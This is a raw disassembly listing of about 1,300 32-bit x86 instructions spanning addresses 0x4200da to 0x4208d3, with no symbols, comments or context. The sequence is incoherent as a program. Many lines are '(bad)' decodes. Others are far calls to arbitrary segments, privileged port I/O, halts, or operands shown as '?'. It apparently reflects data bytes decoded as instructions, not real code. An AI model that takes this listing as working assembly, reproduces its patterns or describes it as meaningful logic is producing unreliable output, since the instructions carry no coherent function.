  4200da:	jbe    0x42014d
  4200dc:	call   0x8e6102a6
  4200e1:	push   ebp
  4200e2:	dec    ebx
  4200e3:	mov    eax,0x3f57d7e1
  4200e8:	mov    al,ss:0x3caf85c6
  4200ee:	stos   DWORD PTR es:[edi],eax
  4200ef:	popa   
  4200f0:	jecxz  0x420092
  4200f2:	and    eax,0xe5f3c168
  4200f7:	cmp    edx,DWORD PTR [edx]
  4200f9:	mov    esi,0x22ec1113
  4200fe:	cmp    dh,dh
  420100:	and    eax,0x615699b
  420105:	or     DWORD PTR [edx+0xe547a10],ebp
  42010b:	dec    edi
  42010c:	mov    esp,0xccddef47
  420111:	mov    ?,WORD PTR [edx-0x36cb2a7c]
  420117:	out    dx,al
  420118:	imul   ebp,esi,0x1e
  42011b:	add    esp,DWORD PTR cs:[ecx-0x4616f4]
  420122:	(bad)  
  420124:	loopne 0x42018c
  420126:	xor    edi,DWORD PTR [ebx+eiz*8]
  420129:	cmp    al,0x80
  42012b:	rcl    BYTE PTR [ebx],cl
  42012d:	pusha  
  42012e:	xor    DWORD PTR [ebx-0x56e36d25],0xc33480cd
  420138:	popa   
  420139:	add    bh,al
  42013b:	xor    edi,DWORD PTR [edx]
  42013d:	test   BYTE PTR [edi+0x5413b14],0x2d
  420144:	ins    DWORD PTR es:[edi],dx
  420145:	add    eax,0xa103d6fc
  42014a:	loopne 0x4201c1
  42014c:	(bad)  
  42014d:	ss dec ecx
  42014f:	iret   
  420150:	sub    eax,0xb7b3bd75
  420155:	js     0x4200f1
  420157:	lock xchg BYTE PTR [ecx+ebx*4],dl
  42015b:	push   edi
  42015c:	mov    edi,eax
  42015e:	pop    ss
  42015f:	sbb    ebx,DWORD PTR [edx-0x5fb0e91a]
  420165:	xor    esp,DWORD PTR [esi]
  420167:	sub    dl,BYTE PTR [edi-0x54]
  42016a:	dec    esi
  42016b:	addr16 clc 
  42016d:	lea    esi,[ebx-0x6b54d0bc]
  420173:	scas   al,BYTE PTR es:[edi]
  420174:	(bad)  
  420176:	jae    0x420155
  420178:	movq   mm6,QWORD PTR [edi*1+0x1e5da7b5]
  420180:	gs dec esi
  420182:	fisttp WORD PTR [ecx-0x11]
  420185:	repnz bound ebp,QWORD PTR [ebx-0x12]
  420189:	adc    dh,BYTE PTR [eax+0xa38a05b]
  42018f:	jp     0x42017f
  420191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420192:	add    edx,edi
  420194:	icebp  
  420195:	mov    eax,ds:0x8d4c53ad
  42019a:	pop    ss
  42019b:	fidiv  WORD PTR [edi]
  42019d:	icebp  
  42019e:	fld    QWORD PTR [esp+esi*8-0x2e0d15e5]
  4201a5:	mov    dl,0xcd
  4201a7:	loopne 0x4201a6
  4201a9:	dec    esi
  4201aa:	push   edi
  4201ab:	mov    BYTE PTR [ecx],dl
  4201ad:	mov    dh,0x79
  4201af:	or     DWORD PTR [edi+ecx*1-0x45],ebx
  4201b3:	and    eax,DWORD PTR [eax-0x77]
  4201b6:	mov    esp,0xa1b39363
  4201bb:	xchg   ecx,eax
  4201bc:	and    esi,DWORD PTR [edx+0x70dd3ee6]
  4201c2:	mov    bh,0x3f
  4201c4:	mov    BYTE PTR [edx+ecx*2+0xb24c0ca],dh
  4201cb:	dec    esi
  4201cc:	(bad)  
  4201cd:	call   0x529ff83b
  4201d2:	mov    ds:0xc6e5d5c5,eax
  4201d7:	(bad)
  4201da:	or     bl,bl
  4201dc:	push   cs
  4201dd:	mov    ss,WORD PTR [esi+esi*1-0x4b]
  4201e1:	mov    esi,0x924e85d2
  4201e6:	pop    edx
  4201e7:	add    DWORD PTR [ecx-0x3de10c4e],ebp
  4201ed:	mov    cs,WORD PTR ds:0x85d58003
  4201f3:	(bad)
  4201f6:	aam    0x61
  4201f8:	sbb    BYTE PTR [ecx-0x78e274fd],ah
  4201fe:	lods   eax,DWORD PTR ds:[esi]
  4201ff:	and    al,0xca
  420201:	add    al,0x50
  420203:	inc    edi
  420204:	repz sub bh,BYTE PTR [edx]
  420207:	push   ecx
  420208:	lods   eax,DWORD PTR ds:[esi]
  420209:	inc    edx
  42020a:	jnp    0x42023d
  42020c:	fst    QWORD PTR [edx+0x3a4f1593]
  420212:	inc    esi
  420213:	lods   al,BYTE PTR ds:[esi]
  420214:	mov    eax,0x78430eab
  420219:	jno    0x420272
  42021b:	nop
  42021c:	sbb    eax,0xe36b9c1
  420221:	ins    DWORD PTR es:[edi],dx
  420222:	cmp    al,0x26
  420224:	fist   DWORD PTR [eax+0x26d33539]
  42022a:	sbb    dl,dh
  42022c:	shl    DWORD PTR [esi-0x6a],0xef
  420230:	lahf   
  420231:	sbb    ecx,DWORD PTR [esi+0x22]
  420234:	in     al,0x16
  420236:	jno    0x420253
  420238:	test   BYTE PTR [ecx+0x22],ah
  42023b:	jp     0x4201bf
  42023d:	mov    al,0xf8
  42023f:	leave  
  420240:	pop    ebp
  420241:	mov    edx,0x92f3c48b
  420246:	push   edx
  420247:	lahf   
  420248:	jae    0x420272
  42024a:	test   DWORD PTR [ecx-0x1210dc0e],ecx
  420250:	mov    dl,0x82
  420252:	push   ebp
  420253:	inc    edi
  420254:	jp     0x42022d
  420256:	in     eax,0x15
  420258:	push   cs
  420259:	stc    
  42025a:	cmp    al,0xad
  42025c:	pop    esi
  42025d:	lea    eax,[edi+0x53]
  420260:	dec    ebx
  420261:	or     ah,BYTE PTR [ebp+ecx*4+0x671b3da4]
  420268:	hlt    
  420269:	mov    BYTE PTR [ebx-0x59],0xd5
  42026d:	es jmp 0x420234
  420270:	jmp    0x3ea0:0xf9d57efe
  420277:	add    edx,DWORD PTR [ebp+0x2f884952]
  42027d:	add    DWORD PTR [esp+ebp*2+0x59],ebx
  420281:	ror    DWORD PTR [edx-0x14],cl
  420284:	push   edx
  420285:	cli    
  420286:	call   0x7d9e:0xb618c171
  42028d:	icebp  
  42028e:	add    ebx,edi
  420290:	push   ss
  420291:	mov    dl,0x2d
  420293:	xchg   edi,eax
  420294:	das    
  420295:	push   esi
  420296:	inc    ecx
  420297:	mov    eax,ds:0x250350d2
  42029c:	push   edx
  42029d:	pop    edx
  42029e:	push   es
  42029f:	dec    edx
  4202a0:	jno    0x420301
  4202a2:	and    DWORD PTR [ebp+ecx*2-0x514227b1],0xd6f1533f
  4202ad:	adc    dh,dl
  4202af:	dec    eax
  4202b0:	fmul   DWORD PTR [ebx+edx*2-0x5a]
  4202b4:	shl    DWORD PTR [esi],1
  4202b6:	xchg   ebx,eax
  4202b7:	push   esp
  4202b8:	pop    es
  4202b9:	leave  
  4202ba:	jge    0x420331
  4202bc:	xor    edx,DWORD PTR [esi+esi*8-0x74bafbab]
  4202c3:	into   
  4202c4:	div    BYTE PTR [ecx]
  4202c6:	loope  0x420297
  4202c8:	xchg   ebx,eax
  4202c9:	or     al,0xd4
  4202cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202cc:	test   al,0x97
  4202ce:	pop    edi
  4202cf:	add    dl,BYTE PTR [eax+0x5f3fccce]
  4202d5:	ins    BYTE PTR es:[edi],dx
  4202d6:	popf   
  4202d7:	pusha  
  4202d8:	(bad)  
  4202d9:	dec    esi
  4202da:	in     al,dx
  4202db:	retf   0xa1cb
  4202de:	fisub  DWORD PTR [edi+0x0]
  4202e1:	in     al,dx
  4202e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e3:	outs   dx,DWORD PTR ds:[esi]
  4202e4:	cmp    BYTE PTR [ebx],cl
  4202e6:	mov    DWORD PTR [esi],ebx
  4202e8:	add    al,0xc1
  4202ea:	mov    ds:0x59767431,al
  4202ef:	hlt    
  4202f0:	data16 jnp 0x4202c3
  4202f3:	xor    BYTE PTR [eax],bl
  4202f5:	lods   eax,DWORD PTR ds:[esi]
  4202f6:	sbb    BYTE PTR [edi+0x76cb90fa],dh
  4202fc:	les    esp,FWORD PTR [esi-0x17]
  4202ff:	jp     0x420344
  420301:	sbb    dh,BYTE PTR [ecx+ebx*8+0x7d]
  420305:	aam    0xbf
  420307:	(bad)  
  420308:	fist   DWORD PTR [ebx-0x3426db90]
  42030e:	sub    edi,DWORD PTR [ebp-0x5f58fc8c]
  420314:	addr16 mov bh,0x82
  420317:	fnstenv [ecx-0xc32ad9d]
  42031d:	(bad)  
  42031e:	fist   WORD PTR [ebx]
  420320:	lea    edi,[ecx+0x50b2c605]
  420326:	adc    al,0xf9
  420328:	imul   ebp,DWORD PTR [esi+0x3f],0x9227a271
  42032f:	mov    ds:0xb3e7149,al
  420334:	jno    0x4202b8
  420336:	sub    eax,0x19893aaf
  42033b:	adc    eax,0xa539cbce
  420340:	mov    DWORD PTR [ecx+0x2aac472],ecx
  420346:	sbb    bl,cl
  420348:	pop    eax
  420349:	outs   dx,BYTE PTR ds:[esi]
  42034a:	jne    0x420389
  42034c:	das    
  42034d:	jbe    0x420368
  42034f:	and    dh,dl
  420351:	mov    ah,0xb
  420353:	aaa    
  420354:	push   esp
  420355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420356:	xchg   ecx,eax
  420357:	sbb    DWORD PTR [edx],ebx
  420359:	mov    edi,0x69983ae
  42035e:	dec    edx
  42035f:	mov    ebx,0x6d9c77d0
  420364:	dec    ebp
  420365:	adc    bl,dh
  420367:	aaa    
  420368:	xor    ch,0xfe
  42036b:	and    esi,edi
  42036d:	sub    BYTE PTR [esi+0x11],cl
  420370:	sub    al,0x63
  420372:	sub    cl,ah
  420374:	mov    dl,0xf3
  420376:	and    ebp,ecx
  420378:	ficomp WORD PTR [edx]
  42037a:	push   cs
  42037b:	addr16 jnp 0x420356
  42037e:	and    al,0xad
  420380:	daa    
  420381:	vorps  ymm1,ymm2,YMMWORD PTR [edx]
  420385:	adc    esi,DWORD PTR ds:0x44897023
  42038b:	popa   
  42038c:	lods   al,BYTE PTR ds:[esi]
  42038d:	push   es
  42038e:	mov    edx,cs
  420390:	ss jg  0x4203f3
  420393:	jge    0x42039d
  420395:	call   0x5461240a
  42039a:	pop    ss
  42039b:	lock or dl,bh
  42039e:	mov    ecx,0xb61ded35
  4203a3:	sub    BYTE PTR [edx],bl
  4203a5:	mov    dl,0xea
  4203a7:	xchg   esp,eax
  4203a8:	iret   
  4203a9:	dec    edi
  4203aa:	les    ebp,FWORD PTR [edi+edi*1-0x7e]
  4203ae:	mov    eax,0xf69779d5
  4203b3:	ja     0x4203a6
  4203b5:	pop    esp
  4203b6:	cld    
  4203b7:	dec    eax
  4203b8:	and    esp,edi
  4203ba:	test   al,0x11
  4203bc:	shl    DWORD PTR [esi+edi*8-0x4267628f],0x9e
  4203c4:	retf   0x5dfc
  4203c7:	ins    BYTE PTR es:[edi],dx
  4203c8:	cwde   
  4203c9:	jge    0x420364
  4203cb:	aas    
  4203cc:	in     al,dx
  4203cd:	jae    0x4203d6
  4203cf:	fistp  DWORD PTR [ecx-0x5a]
  4203d2:	jo     0x42043c
  4203d4:	enter  0xbb4f,0x9b
  4203d8:	push   ecx
  4203d9:	dec    esi
  4203da:	add    BYTE PTR [edx-0x31],0x83
  4203de:	sbb    bl,BYTE PTR [eax+0x2fe5d8d9]
  4203e4:	adc    DWORD PTR ds:0xfc489ff8,edi
  4203ea:	es push eax
  4203ec:	sbb    DWORD PTR [edx-0x338e476],esi
  4203f2:	inc    edi
  4203f3:	mov    fs,eax
  4203f5:	inc    ebp
  4203f6:	sub    esp,DWORD PTR [ebx-0x7a]
  4203f9:	xchg   ebp,eax
  4203fa:	sub    DWORD PTR [esp+ecx*4-0x3c386edc],0x4087b5c
  420405:	mov    DWORD PTR [ebx+0x9c718fa],eax
  42040b:	in     eax,dx
  42040c:	push   0x301855de
  420411:	inc    ebp
  420412:	daa    
  420413:	ficom  DWORD PTR [ebx+0x4da8f434]
  420419:	iret   
  42041a:	jmp    0x4203f9
  42041c:	dec    DWORD PTR [esi+0x6eb4125a]
  420422:	call   0xf2b:0x55386537
  420429:	pop    ds
  42042a:	jne    0x420435
  42042c:	test   DWORD PTR [ecx-0x75b3fbd4],edx
  420432:	inc    edi
  420433:	mov    eax,ds:0xb3b30e8a
  420438:	jae    0x420445
  42043a:	xor    eax,0xf7f76ab5
  42043f:	add    ecx,DWORD PTR [esp+ebx*1-0x7358e919]
  420446:	push   cs
  420447:	sbb    BYTE PTR [edx-0x3ff85ae],ah
  42044d:	push   ebx
  42044e:	xchg   ebx,eax
  42044f:	dec    ecx
  420450:	pushw  cs
  420452:	in     al,0x54
  420454:	or     al,0x7f
  420456:	(bad)  
  420457:	fnstsw ax
  420459:	xchg   edi,eax
  42045a:	add    ch,BYTE PTR [ebx+ebx*2]
  42045d:	mov    eax,ds:0x44d6c39a
  420462:	mov    bh,0x76
  420464:	into   
  420465:	daa    
  420466:	in     eax,0xfe
  420468:	sar    BYTE PTR [esi],cl
  42046a:	inc    eax
  42046b:	or     cl,ah
  42046d:	jae    0x42042c
  42046f:	addr16 push ebx
  420471:	jae    0x420478
  420473:	jmp    0x420405
  420475:	inc    DWORD PTR [ecx-0x51]
  420478:	jae    0x42045d
  42047a:	cwde   
  42047b:	pop    eax
  42047c:	pop    eax
  42047d:	jno    0x420421
  42047f:	js     0x420488
  420481:	mov    ah,0x52
  420483:	and    esp,DWORD PTR [eax]
  420485:	sub    eax,0x52f4a02c
  42048a:	mov    al,0xa4
  42048c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42048d:	inc    ecx
  42048e:	xchg   ebp,eax
  42048f:	ja     0x420425
  420491:	daa    
  420492:	dec    eax
  420493:	sub    BYTE PTR [eax],ch
  420495:	push   ds
  420496:	jle    0x4204d3
  420498:	nop
  420499:	and    bl,cl
  42049b:	shr    DWORD PTR [esi],0xed
  42049e:	mov    ch,0x4e
  4204a0:	pop    es
  4204a1:	lods   eax,DWORD PTR ds:[esi]
  4204a2:	cwde   
  4204a3:	dec    ebp
  4204a4:	jge    0x420515
  4204a6:	jae    0x4204a0
  4204a8:	mov    dl,0xcc
  4204aa:	je     0x420472
  4204ac:	sbb    BYTE PTR [ebp-0x5b],0xe3
  4204b0:	xchg   esp,eax
  4204b1:	cmp    bl,bl
  4204b3:	jmp    0x420496
  4204b5:	cmc    
  4204b6:	and    DWORD PTR [esi],ebx
  4204b8:	movaps xmm5,XMMWORD PTR [esi]
  4204bb:	dec    ecx
  4204bc:	out    dx,al
  4204bd:	ss (bad) 
  4204bf:	imul   ebx,DWORD PTR ds:0xe8e26c6c,0x20ea80e6
  4204c9:	or     ah,BYTE PTR [edx-0x3d]
  4204cc:	js     0x4204b5
  4204ce:	mov    eax,ds:0x574ce05f
  4204d3:	jne    0x4204e1
  4204d5:	js     0x42052f
  4204d7:	(bad)  
  4204d9:	mov    esp,0x82046592
  4204de:	cmp    DWORD PTR [edi],eax
  4204e0:	jl     0x4204f1
  4204e2:	icebp  
  4204e3:	push   eax
  4204e4:	cmp    bh,dh
  4204e6:	dec    esi
  4204e7:	jge    0x42053d
  4204e9:	xchg   ebp,eax
  4204ea:	push   ebp
  4204eb:	imul   edi,ebp,0x196c04fa
  4204f1:	xchg   esi,eax
  4204f2:	push   ecx
  4204f3:	out    dx,al
  4204f4:	and    ah,0x99
  4204f7:	leave  
  4204f8:	jnp    0x420576
  4204fa:	shr    DWORD PTR [eax-0x65295768],1
  420500:	cmp    eax,0x7f9e0ac1
  420505:	xor    eax,0x6f0b97ba
  42050a:	jg     0x4204d5
  42050c:	iret   
  42050d:	in     eax,dx
  42050e:	mov    edx,0xb19f48ef
  420513:	xchg   esi,eax
  420514:	cmp    al,0xca
  420516:	test   al,0x83
  420518:	adc    dh,ch
  42051a:	cmp    DWORD PTR [eax],edx
  42051c:	adc    bl,dh
  42051e:	loop   0x420527
  420520:	jle    0x42055a
  420522:	mov    eax,ds:0x36fb8aab
  420527:	clc    
  420528:	dec    esp
  420529:	adc    bl,BYTE PTR [ebp-0x57]
  42052c:	add    DWORD PTR [ebp+0x692cc79e],ebx
  420532:	shl    BYTE PTR [ebp+0x625916e5],1
  420538:	aad    0x7f
  42053a:	pop    ebx
  42053b:	gs scas al,BYTE PTR es:[edi]
  42053d:	rol    BYTE PTR [esi-0x1c5c06d0],cl
  420543:	fsubr  QWORD PTR [edi-0x2836e5cc]
  420549:	dec    esi
  42054a:	mov    eax,ds:0x5bebe26f
  42054f:	sti    
  420550:	or     eax,0x19ee6137
  420555:	jl     0x4204e8
  420557:	sbb    ch,dl
  420559:	dec    edi
  42055a:	cs adc eax,0xab947032
  420560:	inc    esp
  420561:	vorps  xmm6,xmm0,xmm3
  420565:	or     eax,0x80a224d9
  42056a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42056b:	lea    edi,[ebx+0x70]
  42056e:	dec    esi
  42056f:	stc    
  420570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420571:	and    eax,0xf8827c46
  420576:	retf   
  420577:	xlat   BYTE PTR ds:[ebx]
  420578:	popf   
  420579:	push   eax
  42057a:	dec    edx
  42057b:	inc    ecx
  42057c:	and    al,0x50
  42057f:	hlt    
  420580:	inc    esp
  420581:	push   edi
  420582:	push   edi
  420583:	inc    esp
  420584:	jnp    0x4205f8
  420586:	scas   eax,DWORD PTR es:[edi]
  420587:	ja     0x420556
  420589:	xor    eax,0x585794b1
  42058e:	xchg   edi,eax
  42058f:	inc    ebx
  420590:	or     al,0x18
  420592:	lods   eax,DWORD PTR ds:[esi]
  420593:	test   cl,ch
  420595:	jmp    0x42060c
  420597:	xor    BYTE PTR [eax],cl
  420599:	mov    eax,ds:0xe982e0c9
  42059e:	into   
  42059f:	fs fwait
  4205a1:	adc    ah,bh
  4205a3:	push   ss
  4205a4:	sbb    edi,esp
  4205a6:	test   eax,ecx
  4205a8:	cwde   
  4205a9:	jae    0x4205f6
  4205ab:	or     al,BYTE PTR [ecx+0x4c93f4bf]
  4205b1:	sub    eax,0xdf227ddf
  4205b6:	sub    dh,cl
  4205b8:	std    
  4205b9:	xor    esi,esi
  4205bb:	mov    ds:0xa82eb835,eax
  4205c0:	add    ecx,DWORD PTR ds:0x4b546f30
  4205c6:	loop   0x420633
  4205c8:	stos   DWORD PTR es:[edi],eax
  4205c9:	out    0xc1,al
  4205cb:	mov    bl,0x23
  4205cd:	add    ah,BYTE PTR [ebp-0x45640e85]
  4205d3:	xchg   edx,eax
  4205d4:	enter  0xbddc,0x1
  4205d8:	or     DWORD PTR ds:0x1c3bcd2a,edi
  4205de:	mov    eax,ds:0x46809e2d
  4205e3:	mov    edi,0xf2c1941e
  4205e8:	jle    0x420619
  4205ea:	pushf  
  4205eb:	mov    WORD PTR ds:0xb18b4145,?
  4205f1:	pop    edx
  4205f2:	out    0x14,eax
  4205f4:	cli    
  4205f5:	and    DWORD PTR [ebp+0x4acf60de],ecx
  4205fb:	cmp    DWORD PTR [eax-0xa03d2a5],ebp
  420601:	ja     0x420584
  420603:	into   
  420604:	scas   al,BYTE PTR es:[edi]
  420605:	xor    DWORD PTR [edx+0x24],0x53
  420609:	imul   BYTE PTR [edi-0x3b6e254c]
  42060f:	pushf  
  420610:	sub    eax,0x45c7549a
  420615:	aam    0xa
  420617:	add    dl,BYTE PTR [eax-0x69]
  42061a:	pop    ebx
  42061b:	adc    al,0x84
  42061d:	loop   0x4205e1
  42061f:	inc    edx
  420620:	push   ebp
  420621:	out    dx,al
  420622:	pop    eax
  420623:	mov    ebp,DWORD PTR [ebp+eax*2-0x14]
  420627:	inc    ecx
  420628:	(bad)  
  420629:	and    BYTE PTR [edi+eiz*2+0x31728e56],ch
  420630:	cmp    eax,0x1825d079
  420635:	mov    ch,0x67
  420637:	inc    edi
  420638:	lods   eax,DWORD PTR ds:[esi]
  420639:	stos   BYTE PTR es:[edi],al
  42063a:	push   edi
  42063b:	ja     0x42066e
  42063d:	jbe    0x4205ee
  42063f:	jae    0x42065b
  420641:	ss in  eax,0x4d
  420644:	scas   al,BYTE PTR es:[edi]
  420645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420646:	fiadd  DWORD PTR [esi]
  420648:	pop    edi
  420649:	std    
  42064a:	clc    
  42064b:	mov    ch,0x9f
  42064d:	add    ebx,DWORD PTR gs:[eax+0x63904ae]
  420654:	mov    si,WORD PTR gs:[edx]
  420658:	ins    BYTE PTR es:[edi],dx
  420659:	inc    esp
  42065a:	repnz pop ebx
  42065c:	into   
  42065d:	push   0x12
  42065f:	or     BYTE PTR [ebp-0x23],ah
  420662:	inc    ebx
  420663:	push   ecx
  420664:	fisttp WORD PTR [ebx-0x47324378]
  42066a:	in     eax,dx
  42066b:	int3   
  42066c:	mov    BYTE PTR [edi-0x62e9e814],al
  420672:	stos   BYTE PTR es:[edi],al
  420673:	and    al,0x4b
  420675:	sbb    ecx,DWORD PTR [edi-0x4d]
  420678:	inc    eax
  420679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42067a:	je     0x420601
  42067c:	ins    DWORD PTR es:[edi],dx
  42067d:	cld    
  42067e:	fwait
  42067f:	jle    0x4206f4
  420681:	mov    edx,edx
  420683:	pop    eax
  420684:	loop   0x4206de
  420686:	xchg   ebp,eax
  420687:	or     al,0x3c
  420689:	mov    al,0x32
  42068b:	jae    0x4206c3
  42068d:	jl     0x4206b6
  42068f:	(bad)  
  420690:	or     BYTE PTR [ecx+0x3f],al
  420693:	mov    ch,0x6a
  420695:	fs and DWORD PTR ss:[edi-0x3b],ebx
  42069a:	mov    dl,0xfb
  42069c:	pop    ebx
  42069d:	mov    ?,edx
  42069f:	xor    ah,dl
  4206a1:	xlat   BYTE PTR ds:[ebx]
  4206a2:	shl    BYTE PTR [eax],1
  4206a4:	dec    ebp
  4206a5:	mov    ch,0x94
  4206a7:	or     esp,ebp
  4206a9:	inc    eax
  4206aa:	sbb    al,0xd2
  4206ac:	lea    edi,[edx+0x6e]
  4206af:	jecxz  0x42064e
  4206b1:	gs or  esp,0xed13e3d9
  4206b8:	idiv   BYTE PTR [edi-0x29]
  4206bb:	sbb    al,0x52
  4206bd:	jge    0x420674
  4206bf:	add    DWORD PTR [esi],edx
  4206c1:	pop    eax
  4206c2:	test   DWORD PTR [esi-0xd],ebp
  4206c5:	ins    BYTE PTR es:[edi],dx
  4206c6:	nop
  4206c7:	dec    edx
  4206c8:	test   ebp,esi
  4206ca:	addr16 xor al,0xe7
  4206cd:	out    0x4f,al
  4206cf:	ins    BYTE PTR es:[edi],dx
  4206d0:	les    edx,FWORD PTR [ecx]
  4206d2:	sub    eax,0x41c08a4a
  4206d7:	mov    bl,0xe3
  4206d9:	mov    dh,ah
  4206db:	and    al,dl
  4206dd:	aam    0x3d
  4206df:	je     0x42067f
  4206e1:	xor    BYTE PTR [edi+0x4558dde2],0x96
  4206e8:	sbb    DWORD PTR es:[edi],eax
  4206eb:	std    
  4206ec:	dec    ecx
  4206ed:	lods   eax,DWORD PTR ds:[esi]
  4206ee:	sub    bh,bh
  4206f0:	mov    al,ds:0x40e4425
  4206f5:	cli    
  4206f6:	fwait
  4206f7:	shl    eax,cl
  4206f9:	inc    ebx
  4206fa:	pop    ds
  4206fb:	jmp    0x2d26b5f7
  420700:	mov    gs,WORD PTR [esi+eiz*2]
  420703:	mov    ebp,0x4fabd281
  420708:	fadd   DWORD PTR [edx-0x438280d2]
  42070e:	lahf   
  42070f:	ja     0x4206d8
  420711:	dec    ecx
  420712:	mov    ds:0x8a4759ae,al
  420717:	aaa    
  420718:	pushf  
  420719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42071a:	(bad)  
  42071b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42071c:	idiv   DWORD PTR [eax]
  42071e:	jmp    0xfd5b:0x99f855c0
  420725:	es jb  0x4206cc
  420728:	leave  
  420729:	call   0xb4bd:0x2d2f454e
  420730:	repz or edi,DWORD PTR [edi+0x21315817]
  420737:	dec    BYTE PTR [eax+0x9]
  42073a:	jmp    0x4207b1
  42073c:	jl     0x420716
  42073e:	out    dx,eax
  42073f:	inc    ecx
  420740:	fadd   DWORD PTR [eax]
  420742:	ficomp WORD PTR ds:0xa8dc71dc
  420748:	div    BYTE PTR [ebp+0x51]
  42074b:	inc    edi
  42074c:	jns    0x42079c
  42074e:	(bad)
  420751:	idiv   BYTE PTR [edi+ecx*2-0x51]
  420755:	jg     0x42076c
  420757:	sbb    DWORD PTR [edi+esi*4-0x14d42109],esi
  42075e:	imul   ebx,ecx,0x26
  420761:	call   0x70cc0195
  420766:	pop    ds
  420767:	jnp    0x4207d1
  420769:	fld    DWORD PTR [edx]
  42076b:	inc    esi
  42076c:	sahf   
  42076d:	xor    dh,bl
  42076f:	int3   
  420770:	call   0xf459:0x7be4395e
  420777:	or     al,0x89
  420779:	into   
  42077a:	jae    0x420780
  42077c:	or     BYTE PTR [edi],al
  42077e:	push   0xffffffcf
  420780:	sahf   
  420781:	xlat   BYTE PTR ds:[ebx]
  420782:	mov    ebx,0x992b127
  420787:	scas   eax,DWORD PTR es:[edi]
  420788:	test   eax,0x87c103b1
  42078d:	mov    ecx,ss
  42078f:	aam    0xba
  420791:	jnp    0x420795
  420793:	mov    eax,0xc2e616f5
  420798:	lds    ecx,FWORD PTR [edx]
  42079a:	and    edx,ecx
  42079c:	sbb    BYTE PTR [ecx-0x64],ch
  42079f:	leave  
  4207a0:	std    
  4207a1:	out    dx,al
  4207a2:	std    
  4207a3:	mov    esi,0x30df4a3f
  4207a8:	loop   0x420740
  4207aa:	jp     0x4207bc
  4207ac:	add    al,0xf3
  4207ae:	pop    ecx
  4207af:	sbb    bl,BYTE PTR [edx-0x78e3b92b]
  4207b5:	sbb    al,BYTE PTR [eax-0x268fa291]
  4207bb:	rcl    DWORD PTR [ebx-0x67edf198],1
  4207c1:	rcr    BYTE PTR [eax-0x5fceafce],1
  4207c7:	jns    0x420790
  4207c9:	(bad)  
  4207ca:	in     eax,dx
  4207cb:	mov    ah,0x66
  4207cd:	aam    0x4d
  4207cf:	add    al,0xcf
  4207d1:	xchg   edi,eax
  4207d2:	lods   al,BYTE PTR ds:[esi]
  4207d3:	xchg   edx,eax
  4207d4:	popa   
  4207d5:	fincstp 
  4207d7:	and    eax,0x13
  4207da:	aas    
  4207db:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4207dd:	rcr    ch,1
  4207df:	retf   
  4207e0:	cmp    edx,DWORD PTR gs:[edx+0x38]
  4207e4:	test   DWORD PTR [ebx-0x3b],esi
  4207e7:	out    0xef,eax
  4207e9:	inc    esp
  4207ea:	out    0x6c,eax
  4207ec:	add    ch,BYTE PTR [edi-0x3]
  4207ef:	dec    esp
  4207f0:	sub    BYTE PTR [ecx-0x8a17d36],dh
  4207f6:	test   DWORD PTR [ebx+0x56],ebp
  4207f9:	sub    ecx,edi
  4207fb:	push   0xffffffe1
  4207fd:	call   0xea646508
  420802:	push   ds
  420803:	jmp    0xd95854f8
  420808:	dec    eax
  420809:	mov    eax,ds:0x1be433be
  42080e:	jmp    0x4207f7
  420810:	sahf   
  420811:	cld    
  420812:	xor    eax,0xadbc8f98
  420817:	lock inc ebx
  420819:	call   0xa67802fd
  42081e:	push   edx
  42081f:	sbb    DWORD PTR [eax+0x55],edi
  420822:	pop    ebp
  420823:	xchg   edi,eax
  420824:	cs in  eax,0x74
  420827:	retf   
  420828:	sti    
  420829:	xor    DWORD PTR [eax-0x50],esi
  42082c:	cld    
  42082d:	fdiv   DWORD PTR [ebx-0x69181f43]
  420833:	test   al,0xed
  420835:	fs loopne 0x420826
  420838:	sub    al,0xd6
  42083a:	dec    edi
  42083b:	aaa    
  42083c:	loopne 0x420888
  42083e:	nop
  42083f:	out    dx,eax
  420840:	xor    bl,dl
  420842:	mov    ah,0xed
  420844:	test   eax,0xe2f86161
  420849:	into   
  42084a:	mov    esi,0xb357c8f7
  42084f:	adc    DWORD PTR [esi+edi*2],esi
  420852:	int3   
  420853:	and    ebx,esp
  420855:	adc    BYTE PTR [eax],ch
  420857:	inc    esp
  420858:	mov    ah,0xb0
  42085a:	das    
  42085b:	bound  eax,QWORD PTR [ebx]
  42085d:	xchg   ecx,eax
  42085e:	sbb    BYTE PTR [ebx],0x89
  420861:	sbb    BYTE PTR [eax],ch
  420863:	sub    al,BYTE PTR [ebx-0x2c91a028]
  420869:	int3   
  42086a:	or     ebx,DWORD PTR [esi+0x14]
  42086d:	or     ecx,eax
  42086f:	mov    eax,0xfc7309bf
  420874:	push   ecx
  420875:	xchg   ecx,eax
  420876:	outs   dx,BYTE PTR ds:[esi]
  420877:	stos   DWORD PTR es:[edi],eax
  420878:	jae    0x4208d5
  42087a:	rol    esi,cl
  42087c:	stos   BYTE PTR es:[edi],al
  42087d:	retf   0xc36a
  420880:	repnz (bad) [edx+0x1b7cd60c]
  420887:	std    
  420888:	mov    esi,ecx
  42088a:	add    eax,0x957b7320
  42088f:	jecxz  0x4208e6
  420891:	out    0x51,eax
  420893:	ins    BYTE PTR es:[edi],dx
  420894:	dec    ebp
  420895:	or     eax,0x8a97ec0b
  42089a:	je     0x4208dd
  42089c:	call   0x2401:0xd8646e2c
  4208a3:	rol    BYTE PTR [edx+ecx*1-0x5da8bb8b],1
  4208aa:	sbb    DWORD PTR ds:0x2ef64b77,esi
  4208b0:	mov    fs,WORD PTR [eax-0x35e284ef]
  4208b6:	nop
  4208b7:	adc    BYTE PTR gs:0x51dda2c5,dl
  4208be:	outs   dx,BYTE PTR ds:[esi]
  4208bf:	ins    DWORD PTR es:[edi],dx
  4208c0:	jg     0x4208d5
  4208c2:	mov    bh,0xb5
  4208c4:	mov    ebp,0x3c52659a
  4208c9:	retf   
  4208ca:	call   0x6ac5:0x4fb3dd6f
  4208d1:	sbb    ch,al
  4208d3:	cdq    
